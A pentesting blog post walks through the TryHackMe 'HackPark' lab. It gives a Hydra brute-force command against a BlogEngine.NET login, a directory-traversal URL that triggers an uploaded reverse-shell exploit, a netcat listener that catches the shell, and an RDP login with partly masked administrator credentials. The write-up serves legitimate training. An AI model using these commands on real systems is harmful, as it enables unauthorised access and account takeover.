<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackPark Writeup - TryHackMe" /><meta property="og:locale" content="en" /><meta name="description" content="This time we will be solving the HackPark room from TryHackMe. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey." /><meta property="og:description" content="This time we will be solving the HackPark room from TryHackMe. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey." /><link rel="canonical" href="https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/" /><meta property="og:url" content="https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-31T20:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackPark Writeup - TryHackMe" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-07-31T20:00:00-04:00","datePublished":"2020-07-31T20:00:00-04:00","description":"This time we will be solving the HackPark room from TryHackMe. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey.","headline":"HackPark Writeup - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/"},"url":"https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/"}</script><title>HackPark Writeup - TryHackMe | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackPark Writeup - TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackPark Writeup - TryHackMe</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1596240000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-07-31 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="924 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p>This time we will be solving the <a href="https://tryhackme.com/room/hackpark">HackPark</a> room from <a href="https://tryhackme.com/">TryHackMe</a>. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey.</p><h2 id="room-info"><span class="mr-2">Room info</span><a href="#room-info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/THM/HackPark/01-machine-info.png" alt="Machine Info" title="Machine Info" data-proofer-ignore></p><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>For some reason, nmap is not giving any information about the open ports for this machine, but I’ll anticipate that we have ports <strong>80</strong> and <strong>3389</strong> open.</p><p>First of all, taking a look of the website <code class="language-plaintext highlighter-rouge">http://10.10.203.246</code> we can see the following landing page:</p><p><img data-src="/images/THM/HackPark/00-landing-page.png" alt="Landing Page" title="Landing Page" data-proofer-ignore></p><p>Doing a reverse image search on the clown picture, we can tell that is <strong>Pennywise</strong> from IT movie.</p><p>Moving on, the next interesting section of the website is the <strong>Log In</strong> panel on the right menu.</p><p><img data-src="/images/THM/HackPark/02-login.png" alt="Right Menu" title="Right Menu" data-proofer-ignore></p><p>So, we click on <strong>Log In</strong> and get to a login page. In the landing page we see <strong>Blogengine.net</strong> and a typical login form for username and password inputs.</p><p>URL: <code class="language-plaintext highlighter-rouge">http://10.10.203.246/Account/login.aspx</code></p><p><img data-src="/images/THM/HackPark/03-blog-login.png" alt="Login" title="Login" data-proofer-ignore></p><p>As we know, the room description says we’ll be using Hydra for bruteforcing. So, before that is important to know what is the default user for <strong>Blogengine</strong>.</p><p>After a quick Google research we got <strong>admin</strong> as the default user and from now on just need to obtain the password through brute-forcing with Hydra.</p><h2 id="gaining-access"><span class="mr-2">Gaining access</span><a href="#gaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>After having decided to use Hydra, we must know what information to provide to make it work. For brute-forcing a web form the syntax is as follow:</p><blockquote><p>hydra -l [User] -P [Pass] [Target IP] [Request Method] “[Login form Path]:[Request body]:[Failure message]”</p></blockquote><ul><li>The user field is <code class="language-plaintext highlighter-rouge">admin</code>.<li>For the <strong>Pass</strong> field we will be using <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist.<li>The target IP is <code class="language-plaintext highlighter-rouge">10.10.203.246</code>.<li>The login form path will be <code class="language-plaintext highlighter-rouge">/Account/login.aspx</code>.</ul><p>For the rest, we will have to do a little research on the login page. Using the Developer tools from our browser we can see how the login form sends the request.</p><p>The network tab will show us the request method whenever we make a submit on the login form. So, let’s go ahead and make a request with the following parameters:</p><ul><li>Username: <code class="language-plaintext highlighter-rouge">usertest</code>.<li>Password: <code class="language-plaintext highlighter-rouge">passtest</code>.</ul><p><img data-src="/images/THM/HackPark/03-form-method.png" alt="Method" title="Method" class="align-center" data-proofer-ignore></p><p>Now we know the form is using <strong>POST</strong> method to make the request, and using the <strong>Edit and Resend</strong> button in the bottom right corner we can see the raw body request. Finally, we also get the message whenever a wrong user/pass is entered: <code class="language-plaintext highlighter-rouge">Login failed</code>.</p><p><img data-src="/images/THM/HackPark/03-request.png" alt="Request" title="Request" class="align-center" data-proofer-ignore></p><p><strong>Request Body</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">__VIEWSTATE</span><span class="o">=</span>49GAAjlZ%2B4B1%2Bz38DrOFSr7m8aWbh0CXLp8Xr2aPBM2liP4BPRanZv%2Bsnfh62wyJQLsPPiHvYs6oZ5ngezwSDWtN9kSbkJYkqhj%2Fdcvfk0iQv7ShrL9zDiVLHkHAzvF7bEV0%2FgUB5BfJVrw0MFhYcvzn9a0rlmhy8J%2BMjjD53W4mULD4&amp;__EVENTVALIDATION<span class="o">=</span>sXh8q7nd3FnQbnON%2BvVUJwD7BbO7R8oPcmNeBZMWODV4Exie1bp00VsrrcY70IHcnw%2B3oo%2Bgu%2FXsUt2HuFYShgSXZf1qf%2FOosRaywgIUr7HIriKizOiGdSotndccZxhlmHYKGSu9iGAuAQsT5%2BZoAu3zLyGex42pPknzmCQw5%2FRCe%2BUN&amp;ctl00%24MainContent%24LoginUser%24UserName<span class="o">=</span>usertest&amp;ctl00%24MainContent%24LoginUser%24Password<span class="o">=</span>passtest&amp;ctl00%24MainContent%24LoginUser%24LoginButton<span class="o">=</span>Log+in
</pre></table></code></div></div><p>For hydra to work, we need to specify a couple of placeholders for the USER and PASS parameters in the request. If we take a closer look to the raw request, we can see the user and pass entered earlier:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>LoginUser%24UserName=usertest&amp;ctl00%24MainContent%24LoginUser%24Password=passtest
</pre></table></code></div></div><p>So in this case, we replace <strong>usertest</strong> for <code class="language-plaintext highlighter-rouge">^USER^</code> and <strong>passtest</strong> for <code class="language-plaintext highlighter-rouge">^PASS^</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^
</pre></table></code></div></div><p><strong>Full command</strong></p><p>After getting all the information, the full command looks like this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.10.203.246 http-post-form <span class="s2">"/Account/login.aspx:__VIEWSTATE=DuOBP%2BgZJeq6AMydj5niN1uZM%2FDPpZMaxfWo5oEC4brEJy1oBLy29HUrOfHMJVOGXkG1660e6jVooc9Yq08XSwXuS6%2BEAz0wmCd9zrPJ%2FvRTEfvW4%2FydsHFgcUy%2BaIkSagapG4M4u0EK%2FxLTi5gChTWoajmuqFTxAa8qQQJOi7n9k0Fmpfq1MZzahKDFn5OJvCfq6JW%2FQVV4w%2FwQsnL03wpViAbcqU5CAVBTo9igmfmnTanl64dDgoz8ZkXx0sfLD8O136c%2BVm6kcfY3olmQUP34NqflsNH9hVBYr4piqoMqK%2BQjG2SI4cgyyRbcUjLnOryib9veu%2BsGI147wYnLVmnQT1HR0uePIIBJ%2BA3UQJZngtnK&amp;__EVENTVALIDATION=yxXvvmOhIbyz01WxElUbLdtpbMGxCzl5Rt2yC8ppVo8aEkoGj61ik751%2FMdx5Ea6wPF4FA5bjdCtJ%2BJ2terqrBoDEHH8mETsjtorsuBx5xG0AxeHmiNLCZGHt0BDXhVuDeihrfZuN6Wb89YIQvzsLZT4aFAD2DEeuiF3stBpJy%2Bco6jP&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> <span class="nt">-t</span> 60 <span class="nt">-V</span>
</pre></table></code></div></div><p>So we launch hydra and in a couple of minutes we get the password for the user admin.</p><p><img data-src="/images/THM/HackPark/02-hydra-BF-blur.png" alt="Hydra bruteforcing" title="Hydra bruteforcing" class="align-center" data-proofer-ignore></p><p>Logging in, the first thing to do is find the CMS version, for this we navigate to the About tab on the sidebar menu.</p><p><img data-src="/images/THM/HackPark/03-blog-version.png" alt="Blog version" title="Blog version" data-proofer-ignore></p><p>With this information, now we proceed to take a look on exploitdb if there is already an exploit or CVE for this CMS.</p><p><img data-src="/images/THM/HackPark/04-searchsploit.png" alt="Searchsploit" title="Searchsploit" data-proofer-ignore></p><p>There is indeed an exploit available for our CMS version. Lets take a look to the one named <a href="https://www.exploit-db.com/exploits/46353">BlogEngine.NET 3.3.6/3.3.7 - ‘dirPath’ Directory Traversal / Remote Code Execution</a> and read it carefully.</p><p>It is a exploit written in C# which will allow us to get a reverse shell exploiting a vulnerable code in the <code class="language-plaintext highlighter-rouge">PostList.ascx.cs</code> file. To abuse this vulnerability, we have to do the following:</p><ul><li>Edit the exploit with our local IP address and Port for the reverse shell.</ul><p><img data-src="/images/THM/HackPark/04-modify-exploit.png" alt="Exploit" title="Exploit" data-proofer-ignore></p><ul><li>Set a listener with the same parameters.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌─[✗]─[root@parrot]─[/home/hsct/TryHackMe/HackPark]
└──╼ <span class="c">#rlwrap nc -nlvp 443</span>
listening on <span class="o">[</span>any] 443 ...
</pre></table></code></div></div><ul><li>Rename the exploit as: <code class="language-plaintext highlighter-rouge">PostView.ascx</code>.<li>In the CMS, navigate to <strong><em>Content &gt; Posts &gt; New</em></strong> and add a new post uploading our <code class="language-plaintext highlighter-rouge">PostView.ascx</code> file. Click on the open folder icon.</ul><p><img data-src="/images/THM/HackPark/06-upload-01.png" alt="Exploit Upload 1" title="Exploit Upload 1" data-proofer-ignore></p><ul><li>Upload the exploit using the file manager and add it to the new post.</ul><p><img data-src="/images/THM/HackPark/06-upload-02.png" alt="Exploit Upload 2" title="Exploit Upload 2" data-proofer-ignore></p><ul><li>Set a title and save it.</ul><p><img data-src="/images/THM/HackPark/06-upload-03.png" alt="Exploit Upload 3" title="Exploit Upload 3" data-proofer-ignore></p><ul><li>Open the URL: <code class="language-plaintext highlighter-rouge">http://10.10.203.246/?theme=../../App_Data/files</code>.</ul><p>Finally we get the reverse shell.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌─[✗]─[root@parrot]─[/home/hsct/TryHackMe/HackPark]
└──╼ <span class="c">#rlwrap nc -nlvp 443</span>
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.13.0.103] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.203.246] 49428
Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
</pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>For privesc we are going to use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a> which is awesome for a quick system scan. We need to make sure to download the correct version of the binary as we are in a x64 machine.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">Host</span> <span class="kd">Name</span>:                 <span class="kd">HACKPARK</span>
<span class="kd">OS</span> <span class="kd">Name</span>:                   <span class="kd">Microsoft</span> <span class="kd">Windows</span> <span class="kd">Server</span> <span class="m">2012</span> <span class="kd">R2</span> <span class="kd">Standard</span> <span class="kd">Evaluation</span>
<span class="kd">OS</span> <span class="kd">Version</span>:                <span class="m">6</span>.3.9600 <span class="kd">N</span><span class="na">/A </span><span class="kd">Build</span> <span class="m">9600</span>
<span class="kd">OS</span> <span class="kd">Manufacturer</span>:           <span class="kd">Microsoft</span> <span class="kd">Corporation</span>
<span class="kd">OS</span> <span class="kd">Configuration</span>:          <span class="kd">Standalone</span> <span class="kd">Server</span>
<span class="kd">OS</span> <span class="kd">Build</span> <span class="kd">Type</span>:             <span class="kd">Multiprocessor</span> <span class="kd">Free</span>
<span class="kd">Registered</span> <span class="kd">Owner</span>:          <span class="kd">Windows</span> <span class="kd">User</span>
<span class="kd">Registered</span> <span class="kd">Organization</span>:
<span class="kd">Product</span> <span class="kd">ID</span>:                <span class="m">00252</span><span class="o">-</span><span class="m">10000</span><span class="o">-</span><span class="m">00000</span><span class="na">-AA</span><span class="m">228</span>
<span class="kd">Original</span> <span class="kd">Install</span> <span class="kd">Date</span>:     <span class="m">8</span>/3/2019<span class="o">,</span> <span class="m">10</span>:43:23 <span class="kd">AM</span>
<span class="kd">System</span> <span class="kd">Boot</span> <span class="kd">Time</span>:          <span class="m">7</span>/31/2020<span class="o">,</span> <span class="m">9</span>:45:02 <span class="kd">PM</span>
<span class="kd">System</span> <span class="kd">Manufacturer</span>:       <span class="kd">Xen</span>
<span class="kd">System</span> <span class="kd">Model</span>:              <span class="kd">HVM</span> <span class="kd">domU</span>
<span class="kd">System</span> <span class="kd">Type</span>:               <span class="kd">x64</span><span class="na">-based </span><span class="kd">PC</span>
</pre></table></code></div></div><p>With the tool already in the machine, we proceed to run it by simply doing <code class="language-plaintext highlighter-rouge">winPEAS.exe</code> from the console. Then we will take a moment to analyze the output.</p><p>Scrolling through, we reach the following section that looks interesting:</p><p><img data-src="/images/THM/HackPark/06-credentials-blur.png" alt="Autologon Credentials" title="Autologon Credentials" data-proofer-ignore></p><p><strong>winPEAS</strong> just found us some autologon credentials from the <strong>Administrator</strong> user, so the next step will be checking this using RDP.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>xfreerdp /u:Administrator /p:4q6Xv<span class="k">********</span> /v:10.10.203.246
</pre></table></code></div></div><p><img data-src="/images/THM/HackPark/07-admin-access.png" alt="Administrator access" title="Administrator access" data-proofer-ignore></p><p>That’s it! Now we have Administrator privileges and access to the root flag in the desktop.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/thm/'>THM</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/bruteforcing/" class="post-tag no-text-decoration" >bruteforcing</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/tags/hydra/" class="post-tag no-text-decoration" >hydra</a> <a href="/tags/winpeas/" class="post-tag no-text-decoration" >winpeas</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackPark Writeup - TryHackMe - brsalcedom&amp;url=https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackPark Writeup - TryHackMe - brsalcedom&amp;u=https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/HackPark-Writeup-TryHackMe/&amp;text=HackPark Writeup - TryHackMe - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Jeeves-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1635796800" > 2021-11-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jeeves Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla. Información En...</p></div></div></a></div><div class="card"> <a href="/RootMe-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1617350400" > 2021-04-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RootMe Writeup [ES] - TryHackMe</h3><div class="text-muted small"><p> En esta ocasión estaré resolviendo el lab RootMe de la plataforma TryHackMe. Esta máquina es bastante sencilla como se verá a continuación. Lab info Task 1 - Deploy the machine Desplegar la má...</p></div></div></a></div><div class="card"> <a href="/PickleRick-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1617523200" > 2021-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pickle Rick Writeup - TryHackMe</h3><div class="text-muted small"><p> This time i’ll be working with the room Pickle Rick from TryHackMe. This is a free lab with an easy difficulty. Lab info Enumeration All ports nmap scan: nmap -p- -sS --min-rate 5000 -n -v 10....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Blackhole-Challenge-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Blackhole Challenge Writeup [ES] - HackTheBox</p></a> <a href="/Error-Reporting-Protocol-Writeup-247CTF/" class="btn btn-outline-primary" prompt="Newer"><p>Error Reporting Protocol [ES] - 247CTF</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
